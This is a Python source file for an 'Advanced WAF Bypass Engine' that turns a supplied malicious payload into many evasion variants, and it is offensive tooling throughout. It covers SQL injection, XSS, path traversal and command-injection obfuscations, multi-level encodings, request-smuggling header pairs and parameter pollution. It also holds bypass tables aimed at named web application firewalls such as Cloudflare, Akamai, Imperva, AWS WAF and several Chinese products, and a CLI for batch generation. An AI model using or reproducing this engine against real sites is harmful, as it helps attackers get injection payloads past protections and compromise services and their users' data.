#!/usr/bin/env python3
"""Advanced WAF Bypass Engine — protocol, encoding, obfuscation & WAF-specific evasion (v3.0.0).

Capabilities:
  1. Protocol-Level Evasion — method override, version downgrade, chunked encoding,
     request smuggling primitives (CL.TE, TE.CL)
  2. Encoding-Based Bypass — Unicode normalisation, UTF-7, double/triple URL encoding,
     HTML entity encoding, base64 wrapping, hex encoding
  3. Obfuscation Techniques — per-vuln-type generators for SQLi, XSS, Path Traversal,
     Command Injection with advanced mutation strategies
  4. WAF-Specific Rules — bypass strategies tailored to each WAF in the GKN-Phantom
     WAF_SIGNATURES database (Cloudflare, Akamai, Imperva, ModSecurity, 安全狗, 云盾, etc.)
  5. HTTP Parameter Pollution — split payloads across duplicate parameters
  6. Content-Type Switching — switch between JSON, multipart, XML, plaintext

Pure Python 3.10+ standard library. Imports from sibling utils.py and adaptive_engine.py.

Usage (CLI):
  python waf_evasion.py --payload "<original_payload>" --vuln-type sqli \\
      --waf-type cloudflare [--max-variants 10] [--output variants.json]
"""

from __future__ import annotations

import argparse
import html
import os
import random
import sys
import unicodedata
from base64 import b64encode
from dataclasses import dataclass, field

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import dump_json

# Pull WAF_SIGNATURES from the adaptive engine
try:
    from adaptive_engine import WAF_SIGNATURES
except ImportError:
    WAF_SIGNATURES: dict = {}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class EvasionRequest:
    """A single evasion variant with metadata."""
    payload: str
    technique: str
    description: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    content_type: str = "application/x-www-form-urlencoded"
    params_override: dict | None = None


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------
def _url_encode(s: str, times: int = 1) -> str:
    """URL-encode a string N times (1 = single, 2 = double, 3 = triple)."""
    result = s
    for _ in range(times):
        out: list[str] = []
        for ch in result:
            b = ch.encode("utf-8", errors="surrogatepass")
            out.append("".join(f"%{byte:02X}" for byte in b))
        result = "".join(out)
    return result


def _hex_encode(s: str) -> str:
    """Convert string to hex representation (0x... for each byte)."""
    b = s.encode("utf-8", errors="surrogatepass")
    return "".join(f"\\x{byte:02x}" for byte in b)


def _unicode_normalize(s: str, form: str = "NFKC") -> str:
    """Apply Unicode normalization to the payload (NFKC, NFKD)."""
    return unicodedata.normalize(form, s)


def _utf7_encode(s: str) -> str:
    """Encode string as UTF-7 (approximation — real UTF-7 is complex).
    This generates a useful bypass variant by encoding high-codepoint chars.
    """
    result: list[str] = []
    i = 0
    while i < len(s):
        cp = ord(s[i])
        if cp < 0x80:
            result.append(s[i])
        else:
            # Crude UTF-7: + base64 of UTF-16BE bytes followed by -
            utf16be = chr(cp).encode("utf-16-be")
            b64 = b64encode(utf16be).decode("ascii").rstrip("=")
            result.append(f"+{b64}-")
        i += 1
    return "".join(result)


def _html_entity_encode(s: str, hex_entities: bool = False) -> str:
    """Encode characters as HTML entities."""
    if hex_entities:
        return "".join(f"&#x{ord(c):x};" for c in s)
    return "".join(f"&#{ord(c)};" for c in s)


def _base64_wrap(s: str) -> str:
    """Wrap payload in base64."""
    return b64encode(s.encode("utf-8", errors="surrogatepass")).decode("ascii")


def _random_case(s: str) -> str:
    """Randomize case of alphabetic characters."""
    rng = random.Random(42)  # deterministic
    return "".join(c.upper() if c.isalpha() and rng.random() > 0.5 else c for c in s)


def _inline_comment_spaces(s: str) -> str:
    """Replace spaces with inline comment sequences for SQLi bypass."""
    variants = ["/**/", "/*!50000*/", "/**_**/"]
    result = s
    for v in variants:
        result = result.replace(" ", v)
    return result


def _whitespace_variant(s: str) -> str:
    """Replace spaces with alternative whitespace characters."""
    alts = ["\t", "\n", "\x0b", "\x0c", "\r"]
    result = s
    for alt in alts:
        result = result.replace(" ", alt)
    return result


# ---------------------------------------------------------------------------
# Protocol-level evasion
# ---------------------------------------------------------------------------
PROTOCOL_EVASIONS = {
    "method_override": {
        "description": "Override HTTP method via headers to bypass method-based rules",
        "generators": [
            lambda p: EvasionRequest(p, "method_override_get_to_post",
                                     "GET with X-HTTP-Method-Override: POST",
                                     method="GET",
                                     headers={"X-HTTP-Method-Override": "POST"}),
            lambda p: EvasionRequest(p, "method_override_head",
                                     "HEAD request bypasses body inspection rules",
                                     method="HEAD"),
            lambda p: EvasionRequest(p, "method_override_post_to_get",
                                     "POST with ?payload= param (some WAFs skip POST body)",
                                     method="POST",
                                     params_override={"payload": p}),
        ],
    },
    "version_downgrade": {
        "description": "Downgrade HTTP version to bypass advanced inspection",
        "generators": [
            lambda p: EvasionRequest(p, "http_1_0",
                                     "HTTP/1.0 request — some WAFs skip inspection on 1.0",
                                     method="GET",
                                     headers={"Connection": "keep-alive"}),
        ],
    },
    "chunked_transfer": {
        "description": "Use chunked transfer encoding to smuggle payload past reassembly gaps",
        "generators": [
            lambda p: EvasionRequest(p, "chunked_split_keyword",
                                     "Chunk payload at delimiter to break WAF signature match",
                                     method="POST",
                                     headers={"Transfer-Encoding": "chunked"}),
            lambda p: EvasionRequest(p, "chunked_trailer",
                                     "Add trailing headers after chunked body to confuse inspection",
                                     method="POST",
                                     headers={"Transfer-Encoding": "chunked",
                                              "Trailer": "X-PTSKILLTEST"}),
        ],
    },
    "smuggling_cl_te": {
        "description": "HTTP request smuggling: Content-Length vs Transfer-Encoding desync",
        "generators": [
            lambda p: EvasionRequest(p, "cl_te_smuggle_prefix",
                                     "CL.TE smuggling — front-end uses CL, back-end uses TE",
                                     method="POST",
                                     headers={"Content-Length": "0",
                                              "Transfer-Encoding": "chunked"}),
        ],
    },
    "smuggling_te_cl": {
        "description": "HTTP request smuggling: Transfer-Encoding vs Content-Length desync",
        "generators": [
            lambda p: EvasionRequest(p, "te_cl_fake_chunk",
                                     "TE.CL smuggling — front-end uses TE, back-end uses CL",
                                     method="POST",
                                     headers={"Transfer-Encoding": "chunked",
                                              "Content-Length": "4"}),
        ],
    },
}


# ---------------------------------------------------------------------------
# Encoding-based bypass
# ---------------------------------------------------------------------------
ENCODING_EVASIONS = {
    "url_single": {
        "description": "Single URL encoding (e.g., ' -> %27)",
        "fn": lambda p: _url_encode(p, 1),
    },
    "url_double": {
        "description": "Double URL encoding (e.g., ' -> %2527)",
        "fn": lambda p: _url_encode(p, 2),
    },
    "url_triple": {
        "description": "Triple URL encoding (e.g., ' -> %252527)",
        "fn": lambda p: _url_encode(p, 3),
    },
    "unicode_nfkc": {
        "description": "Unicode NFKC normalization bypass",
        "fn": lambda p: _unicode_normalize(p, "NFKC"),
    },
    "unicode_nfkd": {
        "description": "Unicode NFKD normalization bypass",
        "fn": lambda p: _unicode_normalize(p, "NFKD"),
    },
    "utf7": {
        "description": "UTF-7 encoding bypass (legacy IIS/Exchange)",
        "fn": lambda p: _utf7_encode(p),
    },
    "html_entity_decimal": {
        "description": "HTML decimal entity encoding",
        "fn": lambda p: _html_entity_encode(p, hex_entities=False),
    },
    "html_entity_hex": {
        "description": "HTML hex entity encoding",
        "fn": lambda p: _html_entity_encode(p, hex_entities=True),
    },
    "base64": {
        "description": "Base64 wrapping of payload",
        "fn": lambda p: _base64_wrap(p),
    },
    "hex_escaped": {
        "description": "Backslash-hex encoding (\\xNN)",
        "fn": lambda p: _hex_encode(p),
    },
}


# ---------------------------------------------------------------------------
# Per-vuln-type obfuscation generators
# ---------------------------------------------------------------------------
SQLI_OBFUSCATIONS: list[dict] = [
    {
        "technique": "inline_comments",
        "description": "Insert inline comments between SQL keywords to break token matching",
        "generator": lambda p: _inline_comment_spaces(p),
    },
    {
        "technique": "scientific_notation",
        "description": "Use scientific notation for tautologies (e.g., 1e0=1e0 instead of 1=1)",
        "generator": lambda p: p.replace("1=1", "1e0=1e0").replace("' OR '1'='1", "' OR 1e0=1e0-- "),
    },
    {
        "technique": "case_variation",
        "description": "Randomize SQL keyword case to evade case-sensitive signatures",
        "generator": lambda p: _random_case(p),
    },
    {
        "technique": "whitespace_alternatives",
        "description": "Replace spaces with alternative whitespace (TAB, LF, CR, VT, FF, NBSP)",
        "generator": lambda p: _whitespace_variant(p),
    },
    {
        "technique": "null_byte_prefix",
        "description": "Insert null byte to truncate C-based WAF inspection",
        "generator": lambda p: "%00" + p,
    },
    {
        "technique": "buffer_overflow_padding",
        "description": "Pad with comments to overflow WAF buffer limits",
        "generator": lambda p: p + "/*" + "A" * 8000 + "*/",
    },
    {
        "technique": "nested_expressions",
        "description": "Use nested expressions to obfuscate (e.g., OR !!1 instead of OR 1=1)",
        "generator": lambda p: p.replace("1=1", "(SELECT(1))=1"),
    },
    {
        "technique": "hex_literals",
        "description": "Convert string literals to hex (MySQL/PG: 0x..., MSSQL: 0x...)",
        "generator": lambda p: p.replace("'admin'", "0x61646d696e"),
    },
    {
        "technique": "like_operator",
        "description": "Replace '=' with LIKE to evade equality checks",
        "generator": lambda p: p.replace("=", " LIKE "),
    },
    {
        "technique": "concatenation_bypass",
        "description": "Use string concatenation to break keyword detection (e.g., UN/**/ION)",
        "generator": lambda p: p.replace("UNION", "UN/**/ION").replace("SELECT", "SEL/**/ECT"),
    },
]

XSS_OBFUSCATIONS: list[dict] = [
    {
        "technique": "case_variation",
        "description": "XSS tag case randomization",
        "generator": lambda p: _random_case(p),
    },
    {
        "technique": "svg_vector",
        "description": "Convert <script> to <svg/onload=> vector",
        "generator": lambda p: p.replace("<script", "<svg/onload=").replace("</script>", ""),
    },
    {
        "technique": "html_entity_js",
        "description": "Encode JavaScript as HTML entities",
        "generator": lambda p: _html_entity_encode(p, hex_entities=False),
    },
    {
        "technique": "mutation_xss",
        "description": "Mutation XSS (mXSS) — payload designed to survive DOM mutation",
        "generator": lambda p: f"<noscript><p title=\"</noscript><img src=x onerror={p.replace('\"', '&quot;')}>\">",
    },
    {
        "technique": "jsfuck_style",
        "description": "JSFuck-inspired encoding: replace alphanumeric chars with []()!+",
        "generator": lambda p: p.replace("alert", "(!![]+[])[+!![]]+(![]+[])[+!+[]+!![]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]"),
    },
    {
        "technique": "double_encode",
        "description": "Double URL-encode XSS payload",
        "generator": lambda p: _url_encode(p, 2),
    },
    {
        "technique": "backtick_js",
        "description": "Use backticks and String.fromCharCode to build JS payload",
        "generator": lambda p: "`${" + "".join(f"String.fromCharCode({ord(c)})+" for c in p).rstrip("+") + "}`",
    },
    {
        "technique": "eval_base64",
        "description": "Wrap in eval(atob(<base64>)) to hide payload",
        "generator": lambda p: f"eval(atob('{_base64_wrap(p)}'))",
    },
    {
        "technique": "unicode_escape",
        "description": "Unicode escape sequence encoding",
        "generator": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    },
    {
        "technique": "space_to_slash",
        "description": "Replace spaces with / to confuse tokenizers",
        "generator": lambda p: p.replace(" ", "/"),
    },
]

PATH_TRAVERSAL_OBFUSCATIONS: list[dict] = [
    {
        "technique": "unicode_overlong",
        "description": "Overlong UTF-8 encoding of ../ (e.g., %c0%ae%c0%ae/)",
        "generator": lambda p: p.replace("../", "%c0%ae%c0%ae/").replace("..\\", "%c0%ae%c0%ae\\"),
    },
    {
        "technique": "ntfs_stream",
        "description": "NTFS alternate data stream suffix",
        "generator": lambda p: p + "::$DATA",
    },
    {
        "technique": "double_encoding",
        "description": "Double URL-encode traversal sequence",
        "generator": lambda p: _url_encode(p, 2),
    },
    {
        "technique": "forward_backward_mix",
        "description": "Mix forward and backward slashes",
        "generator": lambda p: p.replace("/", "\\").replace("\\\\", "/"),
    },
    {
        "technique": "dot_truncation",
        "description": "Add trailing dots for Windows path normalization",
        "generator": lambda p: p.replace("../", "....//"),
    },
    {
        "technique": "absolute_path",
        "description": "Use absolute paths instead of relative",
        "generator": lambda p: p.replace("../", "/etc/passwd" if "etc" not in p else "../"),
    },
    {
        "technique": "null_byte_truncation",
        "description": "Null byte to truncate extension check",
        "generator": lambda p: p + "%00.html",
    },
]

CMD_INJECTION_OBFUSCATIONS: list[dict] = [
    {
        "technique": "ifs_manipulation",
        "description": "Use $IFS (Internal Field Separator) instead of spaces",
        "generator": lambda p: p.replace(" ", "${IFS}"),
    },
    {
        "technique": "backtick_substitution",
        "description": "Replace $() with backticks",
        "generator": lambda p: p.replace("$(", "`").replace(")", "`"),
    },
    {
        "technique": "nested_expansion",
        "description": "Nested command substitution $($(...)) ",
        "generator": lambda p: p.replace("$(", "$($(").replace(")", "))").replace("$)$(", ""),
    },
    {
        "technique": "wildcard_obfuscation",
        "description": "Use wildcards to hide command names",
        "generator": lambda p: p.replace("/bin/cat", "/b?n/c?t").replace("cat ", "c?t "),
    },
    {
        "technique": "newline_injection",
        "description": "Inject newline to break one-liner filters",
        "generator": lambda p: p.replace(";", "%0a").replace("&&", "%0a%0a"),
    },
    {
        "technique": "case_modification",
        "description": "Linux: use $(tr) to change case of banned keywords",
        "generator": lambda p: p.replace("cat", "$(tr '[A-Z]' '[a-z]'<<<CAT)"),
    },
    {
        "technique": "hex_encoding",
        "description": "Hex-encode command for printf execution",
        "generator": lambda p: f"$(printf \"{_hex_encode(p)}\")",
    },
    {
        "technique": "double_encoding",
        "description": "Double URL-encode command injection payload",
        "generator": lambda p: _url_encode(p, 2),
    },
    {
        "technique": "concatenation",
        "description": "Break command by string concatenation",
        "generator": lambda p: p.replace("cat", "c''at").replace("cat", "c\"\"at"),
    },
]

# Map vuln type -> obfuscation list
OBFUSCATION_MAP: dict[str, list[dict]] = {
    "sqli": SQLI_OBFUSCATIONS,
    "xss": XSS_OBFUSCATIONS,
    "path_traversal": PATH_TRAVERSAL_OBFUSCATIONS,
    "command_injection": CMD_INJECTION_OBFUSCATIONS,
    "ldap": SQLI_OBFUSCATIONS,  # reuse SQLi-like patterns for LDAP injection
    "nosql": [
        {"technique": "json_escape", "description": "Escape injection characters in JSON", "generator": lambda p: p.replace('"', '\\"')},
        {"technique": "double_encoding", "description": "Double URL-encode", "generator": lambda p: _url_encode(p, 2)},
        {"technique": "null_byte", "description": "Null byte prefix", "generator": lambda p: "%00" + p},
    ],
}


# ---------------------------------------------------------------------------
# WAF-specific bypass strategies
# ---------------------------------------------------------------------------
def _waf_cloudflare_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to Cloudflare WAF."""
    strategies = [
        {"technique": "cloudflare_delete_method", "description": "Cloudflare often allows DELETE method without inspection", "payload": payload},
        {"technique": "cloudflare_chunked", "description": "Chunked encoding can bypass Cloudflare body inspection", "payload": payload},
        {"technique": "cloudflare_json_content", "description": "Change Content-Type to application/json to bypass URL-encoded rules", "payload": payload},
        {"technique": "cloudflare_line_wrapping", "description": "Add fake header line wrapping to confuse CF parser", "payload": payload},
    ]
    if vuln_type == "sqli":
        strategies.append({
            "technique": "cloudflare_sqli_inline",
            "description": "Cloudflare: inline comments with version hint bypass keyword block",
            "payload": payload.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"),
        })
    elif vuln_type == "xss":
        strategies.append({
            "technique": "cloudflare_xss_entity",
            "description": "Cloudflare: HTML entities often pass <script> filter",
            "payload": payload.replace("<", "&#x3C;"),
        })
    return strategies


def _waf_imperva_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to Imperva/Incapsula."""
    strategies = [
        {"technique": "imperva_crlf_trick", "description": "Imperva: CRLF in request line can bypass inspection", "payload": payload},
        {"technique": "imperva_multipart", "description": "Imperva: multipart/form-data may be less inspected", "payload": payload},
    ]
    if vuln_type == "sqli":
        strategies.append({
            "technique": "imperva_sqli_case",
            "description": "Imperva: case variation often bypasses keyword filter",
            "payload": _random_case(payload),
        })
    return strategies


def _waf_akamai_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to Akamai."""
    return [
        {"technique": "akamai_padding", "description": "Akamai: large padding before payload may exceed inspection limit", "payload": "A" * 8000 + payload},
        {"technique": "akamai_content_type_switch", "description": "Akamai: XML content type may bypass strict rules", "payload": payload},
    ]


def _waf_modsecurity_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to ModSecurity."""
    strategies = [
        {"technique": "modsec_null_byte", "description": "ModSecurity: null byte after parameter name bypasses inspection", "payload": payload},
        {"technique": "modsec_url_double_encode", "description": "ModSecurity: double URL encoding (known bypass for CRS)", "payload": _url_encode(payload, 2)},
    ]
    if vuln_type == "sqli":
        strategies.append({
            "technique": "modsec_sqli_multipart",
            "description": "ModSecurity: multipart body may skip SQLi rules in some configs",
            "payload": payload,
        })
    elif vuln_type == "command_injection":
        strategies.append({
            "technique": "modsec_cmd_ifs",
            "description": "ModSecurity: $IFS bypasses space-based command injection rules",
            "payload": payload.replace(" ", "${IFS}"),
        })
    return strategies


def _waf_safedog_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to 安全狗 (SafeDog)."""
    strategies = [
        {"technique": "safedog_double_encode", "description": "SafeDog: double URL encoding bypasses keyword filter", "payload": _url_encode(payload, 2)},
        {"technique": "safedog_json", "description": "SafeDog: JSON content-type often bypasses parameter inspection", "payload": payload},
    ]
    if vuln_type == "sqli":
        strategies.append({
            "technique": "safedog_sqli_inline",
            "description": "SafeDog: inline MySQL comments (/*!50000*/) bypass keyword matching",
            "payload": payload.replace("UNION", "/*!50000UnIoN*/").replace("SELECT", "/*!50000SeLeCt*/"),
        })
    elif vuln_type == "xss":
        strategies.append({
            "technique": "safedog_xss_svg",
            "description": "SafeDog: SVG vector bypasses <script> detection",
            "payload": payload.replace("<script", "<svg/onload="),
        })
    return strategies


def _waf_yundun_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to 阿里云盾 (Aliyun Yundun)."""
    strategies = [
        {"technique": "yundun_double_encode", "description": "Yundun: double URL encoding may bypass", "payload": _url_encode(payload, 2)},
        {"technique": "yundun_method_override", "description": "Yundun: PUT method may have less strict rules", "payload": payload},
    ]
    if vuln_type == "sqli":
        strategies.append({
            "technique": "yundun_sqli_scientific",
            "description": "Yundun: scientific notation bypasses numeric comparison detection",
            "payload": payload.replace("1=1", "1e0=1e0").replace("' OR '1'='1", "' OR 1e0=1e0-- "),
        })
    elif vuln_type == "command_injection":
        strategies.append({
            "technique": "yundun_cmd_backtick",
            "description": "Yundun: backticks instead of $() bypass command injection rules",
            "payload": payload.replace("$(", "`").replace(")", "`"),
        })
    return strategies


def _waf_tencent_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to 腾讯云WAF (Tencent Cloud WAF)."""
    return [
        {"technique": "tencent_whitespace", "description": "Tencent: alternative whitespace bypasses keyword filter", "payload": _whitespace_variant(payload)},
        {"technique": "tencent_hex_literal", "description": "Tencent: hex literal encoding bypasses string matching", "payload": payload.replace("'", "%27")},
    ]


def _waf_aws_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to AWS WAF."""
    return [
        {"technique": "aws_ip_spoof", "description": "AWS WAF: X-Forwarded-For spoof may bypass IP-based rules", "payload": payload},
        {"technique": "aws_json_body", "description": "AWS WAF: JSON body may have different rule set", "payload": payload},
    ]


def _waf_sangfor_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to 深信服 (Sangfor)."""
    # Skip bytes 0x00-0x08 which Sangfor may block
    return [
        {"technique": "sangfor_unicode", "description": "Sangfor: Unicode normalization may bypass", "payload": unicodedata.normalize("NFKC", payload)},
        {"technique": "sangfor_chunked", "description": "Sangfor: chunked transfer encoding may bypass body inspection", "payload": payload},
    ]


def _waf_safeline_bypass(payload: str, vuln_type: str) -> list[dict]:
    """Bypass strategies specific to 雷池 SafeLine (Chaitin)."""
    return [
        {"technique": "safeline_encoding", "description": "SafeLine: double encoding often bypasses semantic engine", "payload": _url_encode(payload, 2)},
        {"technique": "safeline_json_post", "description": "SafeLine: JSON POST with string payload bypasses semantic analysis", "payload": payload},
    ]


# WAF-specific bypass dispatch
WAF_BYPASS_DISPATCH: dict[str, callable] = {
    "cloudflare": _waf_cloudflare_bypass,
    "akamai": _waf_akamai_bypass,
    "imperva": _waf_imperva_bypass,
    "aws_waf": _waf_aws_bypass,
    "mod_security": _waf_modsecurity_bypass,
    "safedog": _waf_safedog_bypass,
    "yundun": _waf_yundun_bypass,
    "tencent_waf": _waf_tencent_bypass,
    "sangfor": _waf_sangfor_bypass,
    "chaitin": _waf_safeline_bypass,
    # fallback: generic bypass
    "generic": lambda p, vt: [
        {"technique": "generic_double_url", "description": "Double URL encoding (generic fallback)", "payload": _url_encode(p, 2)},
        {"technique": "generic_null_byte", "description": "Null byte prefix (generic fallback)", "payload": "%00" + p},
        {"technique": "generic_method_get", "description": "Send via GET query string instead of POST body", "payload": p},
    ],
}


# ---------------------------------------------------------------------------
# HTTP Parameter Pollution
# ---------------------------------------------------------------------------
def generate_hpp_variants(payload: str) -> list[dict]:
    """Generate HTTP parameter pollution variants.

    Splits the payload across duplicate parameters using different delimiters
    so WAF inspects each parameter independently but the app concatenates them.
    """
    variants: list[dict] = []

    # Strategy 1: Split at quotes/operators
    if "'" in payload:
        parts = payload.split("'", 1)
        if len(parts) == 2:
            variants.append({
                "technique": "hpp_split_quote",
                "description": "Split payload at first quote mark — WAF sees safe halves",
                "payload_1": parts[0] + "'",
                "payload_2": "'" + parts[1],
            })
    elif " " in payload:
        parts = payload.split(" ", 1)
        if len(parts) == 2:
            variants.append({
                "technique": "hpp_split_space",
                "description": "Split payload at first space — WAF sees safe halves",
                "payload_1": parts[0],
                "payload_2": parts[1],
            })

    # Strategy 2: Same param, safe prefix + dangerous suffix
    variants.append({
        "technique": "hpp_safe_prefix",
        "description": "Send safe value + malicious value as duplicate params",
        "payload_1": "1",
        "payload_2": payload,
    })

    # Strategy 3: Use different delimiters
    variants.append({
        "technique": "hpp_mixed_delimiter",
        "description": "Use ; and & as param delimiters to confuse parsing",
        "payload_1": payload.replace(" ", "%20"),
        "payload_2": payload,
    })

    return variants


# ---------------------------------------------------------------------------
# Content-Type switching
# ---------------------------------------------------------------------------
def generate_content_type_variants(payload: str, vuln_type: str) -> list[dict]:
    """Generate payloads with different Content-Type headers."""
    variants: list[dict] = []

    ct_map = {
        "application/json": lambda p: {"key": payload},
        "multipart/form-data": lambda p: f"------boundary\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n{p}\r\n------boundary--",
        "application/xml": lambda p: f"<?xml version=\"1.0\"?><root><query>{p}</query></root>",
        "text/plain": lambda p: p,
        "application/x-www-form-urlencoded": lambda p: f"q={p}",
    }

    for ct, wrapper in ct_map.items():
        if ct == "application/x-www-form-urlencoded":
            continue  # default, not a switch
        variants.append({
            "technique": f"content_type_{ct.replace('/', '_').replace('-', '_')}",
            "description": f"Send payload with Content-Type: {ct}",
            "content_type": ct,
            "payload": wrapper(payload),
        })

    return variants


# ---------------------------------------------------------------------------
# Main evasion generator
# ---------------------------------------------------------------------------
def generate_evasions(
    payload: str,
    vuln_type: str = "sqli",
    waf_type: str = "generic",
    max_variants: int = 50,
    include_protocol: bool = True,
    include_encoding: bool = True,
    include_obfuscation: bool = True,
    include_waf_specific: bool = True,
    include_hpp: bool = True,
    include_content_type: bool = True,
) -> list[dict]:
    """Generate WAF evasion payload variants.

    Args:
        payload: The original malicious payload to obfuscate.
        vuln_type: sqli | xss | path_traversal | command_injection |
                   ldap | nosql
        waf_type: Key from WAF_SIGNATURES (cloudflare, akamai, imperva,
                  mod_security, safedog, yundun, tencent_waf, etc.) or
                  "generic" for universal evasions.
        max_variants: Maximum number of variants to return.
        include_protocol: Include protocol-level evasions.
        include_encoding: Include encoding-based evasions.
        include_obfuscation: Include per-vuln-type obfuscation.
        include_waf_specific: Include WAF-specific bypass strategies.
        include_hpp: Include HTTP Parameter Pollution variants.
        include_content_type: Include Content-Type switching variants.

    Returns:
        List of evasion variant dicts with keys: technique, description,
        payload, and optionally content_type, method, headers.
    """
    variants: list[dict] = []
    seen: set[str] = set()

    def _add(variant: dict) -> None:
        key = variant.get("payload", "")
        if key and key not in seen:
            seen.add(key)
            variants.append(variant)

    # 1. Encoding-based variants (highest priority — most universal)
    if include_encoding:
        for name, config in ENCODING_EVASIONS.items():
            try:
                encoded = config["fn"](payload)
                if encoded and encoded != payload:
                    _add({
                        "technique": f"encoding_{name}",
                        "description": config["description"],
                        "payload": encoded,
                    })
            except Exception:
                pass

    # 2. Per-vuln-type obfuscation
    if include_obfuscation:
        obfuscations = OBFUSCATION_MAP.get(vuln_type, [])
        for obs in obfuscations:
            try:
                mutated = obs["generator"](payload)
                if mutated and mutated != payload:
                    _add({
                        "technique": f"obfuscation_{obs['technique']}",
                        "description": obs["description"],
                        "payload": mutated,
                    })
            except Exception:
                pass

    # 3. WAF-specific strategies
    if include_waf_specific:
        waf_handler = WAF_BYPASS_DISPATCH.get(waf_type)
        if waf_handler is None:
            waf_handler = WAF_BYPASS_DISPATCH["generic"]
        try:
            for strat in waf_handler(payload, vuln_type):
                p = strat.get("payload", payload)
                if p and p not in seen:
                    seen.add(p)
                    variants.append({
                        "technique": f"waf_{waf_type}_{strat['technique']}",
                        "description": f"[{waf_type}] {strat['description']}",
                        "payload": p,
                    })
        except Exception:
            pass

    # 4. Protocol-level evasions (metadata, not payload mutations)
    if include_protocol:
        for proto_name, proto_config in PROTOCOL_EVASIONS.items():
            for gen in proto_config["generators"]:
                try:
                    ev_req = gen(payload)
                    key = f"proto_{proto_name}_{ev_req.technique}"
                    if key not in seen:
                        seen.add(key)
                        entry: dict = {
                            "technique": f"protocol_{proto_name}",
                            "description": proto_config["description"] + ": " + ev_req.description,
                            "payload": payload,
                            "method": ev_req.method,
                            "headers": ev_req.headers,
                        }
                        if ev_req.content_type:
                            entry["content_type"] = ev_req.content_type
                        if ev_req.params_override:
                            entry["params_override"] = ev_req.params_override
                        variants.append(entry)
                except Exception:
                    pass

    # 5. HTTP Parameter Pollution
    if include_hpp:
        for hpp in generate_hpp_variants(payload):
            key = f"hpp_{hpp['technique']}"
            if key not in seen:
                seen.add(key)
                variants.append({
                    "technique": f"hpp_{hpp['technique']}",
                    "description": hpp["description"],
                    "payload": payload,
                    "hpp_params": {
                        "technique": hpp["technique"],
                        "value_1": hpp.get("payload_1", ""),
                        "value_2": hpp.get("payload_2", ""),
                    },
                })

    # 6. Content-Type switching
    if include_content_type:
        for ct_var in generate_content_type_variants(payload, vuln_type):
            key = f"ct_{ct_var['technique']}"
            if key not in seen:
                seen.add(key)
                variants.append({
                    "technique": ct_var["technique"],
                    "description": ct_var["description"],
                    "payload": ct_var["payload"],
                    "content_type": ct_var["content_type"],
                })

    # Limit to max_variants, preferring diversity
    if len(variants) > max_variants:
        variants = variants[:max_variants]

    return variants


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(description="Advanced WAF Bypass Engine (v3.0)")
    ap.add_argument("--payload", required=True, help="Original malicious payload to obfuscate")
    ap.add_argument("--vuln-type", default="sqli",
                    choices=["sqli", "xss", "path_traversal", "command_injection", "ldap", "nosql"],
                    help="Vulnerability type (default: sqli)")
    ap.add_argument("--waf-type", default="generic",
                    help="Target WAF identifier (cloudflare, akamai, imperva, mod_security, "
                         "safedog, yundun, tencent_waf, sangfor, chaitin, aws_waf, generic)")
    ap.add_argument("--max-variants", type=int, default=50,
                    help="Maximum number of variants to generate (default: 50)")
    ap.add_argument("--output", help="Write JSON variants to file (default: stdout)")
    ap.add_argument("--no-protocol", action="store_true", help="Skip protocol-level evasions")
    ap.add_argument("--no-encoding", action="store_true", help="Skip encoding-based evasions")
    ap.add_argument("--no-obfuscation", action="store_true", help="Skip obfuscation evasions")
    ap.add_argument("--no-waf-specific", action="store_true", help="Skip WAF-specific evasions")
    ap.add_argument("--no-hpp", action="store_true", help="Skip HPP evasions")
    ap.add_argument("--no-content-type", action="store_true", help="Skip content-type switching evasions")
    args = ap.parse_args()

    variants = generate_evasions(
        payload=args.payload,
        vuln_type=args.vuln_type,
        waf_type=args.waf_type,
        max_variants=args.max_variants,
        include_protocol=not args.no_protocol,
        include_encoding=not args.no_encoding,
        include_obfuscation=not args.no_obfuscation,
        include_waf_specific=not args.no_waf_specific,
        include_hpp=not args.no_hpp,
        include_content_type=not args.no_content_type,
    )

    result = {
        "original_payload": args.payload,
        "vuln_type": args.vuln_type,
        "waf_type": args.waf_type,
        "total_variants": len(variants),
        "variants": variants,
        "flags": {
            "protocol_evasions": not args.no_protocol,
            "encoding_evasions": not args.no_encoding,
            "obfuscation_evasions": not args.no_obfuscation,
            "waf_specific_evasions": not args.no_waf_specific,
            "hpp_evasions": not args.no_hpp,
            "content_type_evasions": not args.no_content_type,
        },
    }

    json_out = dump_json(result)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write(json_out)
        print(f"Variants written to {args.output}")
    else:
        print(json_out)

    return 0


if __name__ == "__main__":
    sys.exit(main())
